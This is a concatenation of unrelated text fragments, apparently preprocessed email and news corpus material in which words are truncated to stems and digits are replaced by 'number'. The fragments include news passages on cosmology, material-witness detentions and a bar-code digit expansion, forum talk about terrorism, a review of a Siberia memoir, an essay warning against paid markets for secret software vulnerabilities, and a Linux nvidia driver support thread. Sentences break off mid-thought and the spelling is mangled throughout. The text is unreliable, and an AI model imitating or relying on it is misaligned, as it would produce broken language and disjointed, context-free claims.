physic wa essenti finish and when the english physicist lord kelvin said that just a coupl of cloud remain to be dealt with a few annoi tidbit which turn out to be rel and quantum theori the twin revolut of numberth centuri scienc dr peebl said likewis there ar a few cloud todai like what he call the dark sector which could have more complic physic than cosmologist think i m not convinc these cloud herald revolut as deep as rel and quantum mechan dr peebl said i m not argu that thei won t as for the fate of the univers we will never have a firm answer said dr sandag who wa hubbl s protg and ha seen it all it s like ask doe god exist he said predict the futur he point out requir faith that simpl mathemat model realli work to describ the univers i don t think we realli know how thing work he said although dr sandag doe not bui into all aspect of the emerg orthodoxi he said it wa a fantast time to be aliv it s all work toward a much grander synthesi than we could have imagin number year ago he said i think

univers of minnesota and former execut director for the report committe for freedom of the press it s not hostil or adversari it s simpli skeptic these lower court decis have for the most part not yet been test on appeal and there is reason to think that appeal court and the suprem court will prove more sympathet to the govern s tactic and argument the feder appeal court in richmond va for instanc revers the decis to allow mr hamdi to talk to a lawyer and order the lower court judg to consid addit evid and argument but even the appeal court seem torn and it reject the govern s sweep argument

contain on of the fullest account of it posit on secreci and execut power it main argument is that the court have no role becaus immigr hear ar not realli trial but ar mere administr hear that can be close at will bennet zurofski who also repres mr zeidan said he wa flabbergast by thi suggest a trial is a trial he said a person s liberti is at stake a person is be held in jail a person is be told

decid the court which will hear argument in septemb declin to do that a number of new organ includ the new york time file a brief as a friend of the court in support of the newspap the govern then ask the unit state suprem court to stai judg bissel s order the court in a rel unusu move given that the case wa not befor it for ani other purpos block judg bissel s order suggest that it might have more sympathi for the govern s argument the wit right violat lawyer contend late on sept number feder agent pull two nervou indian men moham jawe azmath and sy gul moham shah off an amtrak train near fort

involv in or were associ with those respons for the sept number attack but even though govern offici told report that the men had been detain as materi wit their lawyer now sai that thei were held last fall onli on immigr violat the distinct is import becaus a materi wit warrant bring the automat appoint of a govern paid lawyer while the govern doe not have to suppli a visa violat with counsel

reinforc of the voyag piec i archiv earlier todai rk emailaddr bigger bar code inch up on retail august number number by kate murphi in a littl more than two year retail in the unit state and canada will face a deadlin that promis technolog challeng akin to the year number comput problem start jan number number the number digit bar code retail us to identifi everyth from car to candi bar will go to number digit the addit number and associ bar and space is enough to make checkout scanner seiz up and make comput crash perhap disrupt entir suppli chain but mani retail have yet to focu on a problem that will requir signific invest in time and capit most retail ar public compani that tend to live quarterli and not look ahead which mean thei ar go to be hit over the head with thi and have to scrambl at the last minut to avert disast said thoma friedman presid of retail system research servic a compani in newton mass that publish a retail inform technolog newslett lead retail sai thei have begun to address the issu a spokesman for wal mart store the world s largest retail said the compani had embrac the concept of an expand bar code but he did not respond to question about actual measur taken to prepar comput databas and logist system similarli a spokesman for the target corpor said hi compani wa intellectu readi for the chang but refus to comment on whether ani of it store or warehous were technolog readi but richard a galanti the chief financi offic of costco wholesal admit the truth is given the timelin everybodi s still in the assess phase try to figur out what to do the difficulti is similar to the on pose by the year number comput problem when comput softwar had to be switch from two digit entri identifi year to four digit entri befor jan number number million of line of code had to be rewritten to avoid widespread comput failur bar code have been us in packag sinc number when the first item a pack of chew gum wa scan at a supermarket in ohio the code identifi a product distinguish between an eight ounc can of del mont cream corn and a medium size pair of hane boxer short when a bar code is scan the inform in the store s databas let the retail assign a price and track sale and inventori the bar code is the linchpin upon which everyth in retail depend mr friedman said the reason for expand the number digit bar code known as the univers product code is twofold first there is a shortag of u p c number there s onli a certain amount of number digit number and we re go to run out said john terwillig vice presid of global market at the univers code council a nonprofit organ base in lawrencevil n j that assign code in the unit state and canada second number digit bar code ar us almost everywher els in the world the council s european counterpart ean intern base in brussel assign these number call european articl number to compani in number nation right now mr terwillig said foreign import have to get a number digit u p c to do busi over here which thei haven t been too happi about foreign manufactur current pass on to consum the cost of get an addit bar code and creat special label for product sold in the unit state and canada it s an ad expens for them and thei have to recoup it somewher said debra shimku market manag at the chicago import compani a specialti food import whose oversea supplier ar often incredul when thei ar told thei have to get new bar code for their product befor thei can be sold in american groceri mani foreign manufactur decid that it is not worth the troubl a lot of compani have been unwil to accept the addit burden mr terwillig said and have stai out of the market entir american and canadian export have not had the same obstacl becaus foreign retail can easili incorpor a number digit number into their number digit databas by make the first digit zero that is why american and canadian manufactur of product that now have number digit code will not be affect by the code expans a two liter bottl of coca cola for exampl will keep the same u p c but a zero will be ad to the begin of it bar code number in retail product databas the effect of the chang in the u p c code fall squar on retail said mr friedman he estim that the upgrad will cost at least dollarnumb million for a chain of number store with number checkout lane a store the expens will vari depend on the ag of a retail s databas softwar and hardwar and whether it ha to hire outsid consult to make the chang scanner and other hardwar bought more than three year ago will not read longer code and will have to be replac softwar more than five year old will also have to be scrap thank god we d alreadi plan to bui new equip for a lot of store thi year said richard s gilbert director of store system at duan read a chain of number drugstor in new york citi the store have a total of number number scan devic each cost dollarnumb number to dollarnumb number as for the cumbersom databas modif that need to be made mr gilbert said our consult sai thei ar work on it but thei haven t gotten back to me with a plan i still don t know how big a deal it s all go to be he might want to ask john poss mr poss is the merchandis coordin for ac hardwar which ha number number store and sell some number number code product ac overhaul it comput system to accept longer bar code in number the compani base in oak brook ill ha retail outlet in number countri and more than a hundr foreign supplier it wa such a struggl to get manufactur to relabel thing for north america mr poss said and we want the same system in place global so we decid to make the chang the compani hire a consult cogniz technolog solut which is base in teaneck n j and is a divis of dun bradstreet ac s in hous team work on the project dure the dai while a cogniz offic in india took over at night even so the project took almost two year to plan and carri out in addit to equip upgrad modif had to be made in more than number softwar program in variou compani divis number in distribut alon the most tediou and time consum part of the convers mr poss said wa make adjust to databas everi databas in everi divis touch bar code inform and thei all need to be rework he said it s like ynumberk where you had to go in and expand field and find everi refer to the date though mr poss would not disclos the cost of the project he said the gain in effici and in supplier good will had been well worth the expens hi advic to other retail is to get busi becaus you re face an extrem challeng but move to number digit mai not be enough the univers code council and ean intern which form an allianc in number strongli advis manufactur and retail to go a step further and prepar their system to accommod a number digit code that is the length of a newli patent bar code that take up less space it reduc size mean that it can be affix to small item like loos produc and the extra digit let a retail keep track of addit data like batch and lot number that addit inform would make product recal easier todai mr terwillig said onc a product is taken out of the ship contain in the warehous you realli can t track it anymor ship contain bar code ar alreadi number digit the differ bar code standard mean that retail need differ comput system for ship and receiv inventori and sale by adopt a number digit standard retail should be abl to put all the inform into a singl databas mr poss said ac had ad the capac to scan and store number digit when it made it convers three year ago now we can scan anyth he said whether it s in the warehous or at the regist and it immedi goe in to a central system no more send data between divis the cost and work of make the transit to number digit he said wa the same as it would have been for a chang to number digit repres from the standard group said adopt a number digit structur a step for which no date ha been set could help streamlin the share of data among all part of a retail oper it would also

distinguish characterist the fantasi about those who ar perpetu delud into a preconceiv notion of how the world need to work hi exampl were veri clear a psychopatholog individu and on a lesser extrem the father who fantas hi son as a footbal player i kinda read level into that distinguish characterist though mean just becaus you believ in the a fantasi doe not mean necessarili that you re go to be an evil terrorist it just mean you re plai alittl game in your head and becaus of that you ar a bit differ from the rest of the wavelength float around in the cosmo at that moment glm make no mistak

mafia s collect fantasi about brotherhood and organ crime or the biker gang s fantasi about be badass on the road or the school board s fantasi about indoctrin your children with jesu but it not equival the terrorist went out and purpos destroi thing and kill peopl thi is bad i don t care what univers you re in while the aspect of fantasi can be appli to all group and that label can be

and media you can bet someth s rotten in the state of denmark so your whole point is we too live in a fantasi sure no question it the thing that bother me about the articl i think the differ between our fantasi and their is that there ar folk out there in our fantasi allow to voic their opinon about the fantasi and keep folk a bit ground in the real versu the made up from what i gather there ar no such guard or protect on their end that the problem with some regeim over other thei all have bad point our is in a collect fantasi that we need to control the oil mask the intent behind a veri

sharp observ of life in russia usual with construct he tell us for instanc you have two choic number you can do it quickli or number you can do it right the soviet construct worker take hi time do thing wrong anyon who ha spent time in siberia know that it inhabit ar a breed apart thei disdain their compatriot in the countri s western region and pride themselv perhap excess on their courag strength and inner fortitud siberia in fact occupi a space in the russian nation psych similar to that of the wild west in american mytholog the effort throughout the numberth and numberth centuri to

the cruel network of gulag in soviet time unfortun littl of thi rich brew of histori and myth make an appear in siberia bound neither do lot of other pertin fact russian often sai that in russia anyth can happen and usual doe so it s easi to believ that two young men could establish a chocol busi on littl more than hope smart and chutzpah but while blake describ establish a cocoa bean import busi with hi friend sasha we never learn how thei met in the first place or why he believ sasha to be a trustworthi associ the two of them strike a deal to sell their bean to a local chocol factori yet we find out virtual noth about the chocol the factori produc is it tasti disgust ar we talk chocol bar chocol truffl or chocol syrup a few detail would go a long wai here the author ha the make of a

littl from on anoth peopl ar forev wink smirk and slap on anoth on the back slam down shot of vodka and make sentiment toast to women and friendship plai an inevit role in ani account of russian life but read about such occas becom tiresom after the numberth or numberth repetit blake is also given to facil comment that ar meant to sound smart but often fall flat democraci and the free market the best institut the west had to offer storm over the border and ran deep into russia he tell us but like all foreign armi throughout histori thei quickli were spread too thin and becam dilut and then there s thi summat of hi time in russia those four year have left me with a lifetim of rabid ambival to chew on until i ve got no teeth left blake manag to includ a few unpleas and wholli unnecessari laugh at the expens of chines worker and gai and although i like wordplai as much as the next gui it s jar when non english speak charact make pun in english in a pinch sai on charact a chocol factori director who warn blake not to store extra cocoa bean on site i m afraid we would probabl take a pinch some of these fault wouldn t matter if siberia bound were a picaresqu novel or an account that didn t aspir to authent but the effect here is to undermin a reader s faith in the narrat s reliabl and to reduc most of the charact to the stock figur encount in dozen of other account of russian life so in the end i believ the broad contour of blake s stori but found it hard to take serious mani of the particular and hi ultim conclus that capit materi comfort and wealth do not bring happi

 on august numberth an entiti known as idefens sent out an announc which is append to thi email briefli idefens which bill itself as a global secur intellig compani is offer cash for inform about secur vulner in comput softwar that ar not publicli known especi if you promis not to tell anyon els if thi kind of secret traffic is allow to continu it will pose a veri seriou threat to our comput commun infrastructur at the moment the domin paradigm for comput secur research known as full disclosur peopl who discov secur vulner in softwar tell the vendor about them and a short while later after the vendor ha had a chanc to fix the problem thei publish the inform includ code to exploit the vulner if possibl thi method ha proven far superior to the old paradigm establish by cert in the late number which it propon might call respons disclosur never releas work exploit code and never releas ani inform on the vulner befor all vendor have releas a patch thi procedur often left hundr of thousand of comput vulner to known bug for month or year while the vendor work on featur and often even after the patch were releas peopl wouldn t appli them becaus thei didn t know how seriou the problem wa the underground comput crimin commun would often discov and exploit these same hole for month or year while the respons disclosur process kept their victim who had no connect in the underground vulner the problem with thi is that vulner that ar wide known ar much less danger becaus their victim can take step to reduc their potenti impact includ disabl softwar turn off vulner featur filter traffic in transit and detect and respond to intrus thei ar therefor much less us to would be intrud also softwar compani usual see secur vulner in their softwar as pr problem and so prefer to delai public and the expens of fix the bug as long as possibl idefens is offer a new altern that appear far more danger than either of the two previou paradigm thei want to be a buyer in a marketplac for secret softwar vulner inform reward discover of vulner with cash not long befor snosoft a group of secur research evid includ some crimin element appar made an offer to sell the secreci of some softwar vulner inform to the softwar vendor specif thei appar made a privat offer to hewlett packard to keep a vulner in hp s trunumb unix secret if hp retain snosoft s consult servic hp consid thi extort and respond with legal threat and snosoft publish the inform if thi is allow to happen it will caus two problem which togeth add up to a catastroph first secret softwar vulner inform will be avail to the highest bidder and to nobodi els for reason explain later i think the highest bidder will gener be organ crime syndic although that will not be obviou to the seller second find softwar vulner and keep them secret will becom lucr for mani more talent peopl the result will be just as in the respons disclosur dai that the good gui will remain vulner for month and year while the major of current vulner ar kept secret i ve heard it argu that the highest bidder will gener be the vendor of the vulner softwar but i don t think that s plausibl if someon can steal dollarnumb number becaus a softwar bug let them the softwar vendor is never held liabl often in fact the peopl who administ the softwar aren t liabl either when credit card data ar stolen from an e commerc site for exampl know about a vulner befor anyon els might save a web site administr some time and it might save the softwar vendor some neg pr but it can net the thief thousand of dollar i think the highest bidder will be those for whom earli vulner inform is most lucr the thiev who can us it to execut the largest heist without get caught inevit that mean organ crime syndic although the particular gang who ar good at network theft mai not yet exist there might be the occasion case where a market leader such as microsoft could make more monei by give their competitor bad pr than a gang could make by theft think of a remot root hole in samba for exampl right now peopl who know how to find secur exploit ar either motiv by person interest in the subject motiv by the public interest motiv by a desir for individu recognit or person know crimin that benefit from their exploit creat a marketplac in secret vulner inform would vastli increas the avail of that inform to the peopl who can afford to pai

 so then mark hammond is all like so given that zodb is sound attract i would packag it up so a few hundr extra k is probabl no big deal the code could fall back to the slow load pickl so peopl run from sourc still work just possibl not as well i haven t us zodb much realli but it sure look like the right wai i don t think it will fly with the unwash unix mass but it sound like a piec of cake with the window crowd that make sens you onli have on os vendor and on processor famili to support i m go to go sulk in dev corner now neal spambay mail list emailaddr httpaddr

 hi there now thi is probabl of no us to you whatsoev but not a deb head but i also have a problem regard nvidia i ve two machin pretti much the same hardwar athlon numberxp s both have nvidia card on gforcenumb ti and a gforcenumbermx both us the same driver modul both have same kernel version albeit it compil for their particular hardwar on work perfectli the other fail to load when i check with lsmod i can see the nvdriver is load but not us thu when i startx it bomb out iu still have x with the default nv driver and crappi acceller numberfp with glxgear should be over numberfp it not a hardwar issu with the card as i swap them over and get the same symptom i reckon my mobo is cack i ve tri swap slot around reserv resourc etc all to no avail should there be an interrupt for the nv card i haven t check the other box yet regard cw on tue number dec number mark page wrote wa run debian woodi perfectli well until i instal the nvidia numberd tar packag you probabl stil ar both the kernel and glx packag instal with no problem and i then amend the xfree config file appropri accord to all instruct neither gdm nor kdm will now fire up return me to the consol screen ie x is broken run startx i isol the problem to a failur to load the nvidia kernel modul by cd ing to the kernel modul file and re run make instal i can get a workabl xserver so you fix x minu the prefer you would get from either gdm or kdm and to be honest the gui is horribl if x is work and you get a brief nvidia splash screen then thi is like noth to do with the driver itself you should be abl to us kdm or gdm with the nvidia xserver what exactli did you chang in your xfnumberconfig will gdm kdm not start i follow the nvidia suggest of make instal sysinclud path to kernel header and whilst thi appear to instal ok upon reboot i am back to the same consol login and have to go through the same reinstal of the kernel modul i have tri rewrit the xf config file to it s origin state with no success well thi sound like the nvidia kernel modul isn t load on boot when it is work do a quick sbin lsmod and look for the modul name someth like nvdriver then put thi on a new line in etc modul in order that linux will load it on boot you can just do modprob nvdriver to load it by hand your make instal did thi as well as reinstal the driver in lib etc you should also get a messag sai load the nvidia driver taint your kernel which it doe in the sens that it s not open sourc is thi a problem anyon els ha encount and what is the best solut can i rid myself of the tar file instal and find some specif deb packag the nvidia driver sourc is in the woodi tree httpaddr so you can do apt get instal nvidia kernel src and then compil although i ve alwai gone the rout you re do now ideal the nvidia driver would be a part of the kernel from dai number howev nvidia have not open sourc it most of the abov sourc is pre compil object code but in order for it to work with your specif kernel you must compil against your kernel header as you did as debian ha lot of potenti kernel thei can t have on nvdriver packag and have chosen instead to provid the sourc actual i don t know if thei re permit to distribut binari by nvidia s licens anywai gavin irish linux user group emailaddr httpaddr for un subscript inform list maintain emailaddr irish linux user group emailaddr httpaddr for un subscript inform list maintain emailaddr
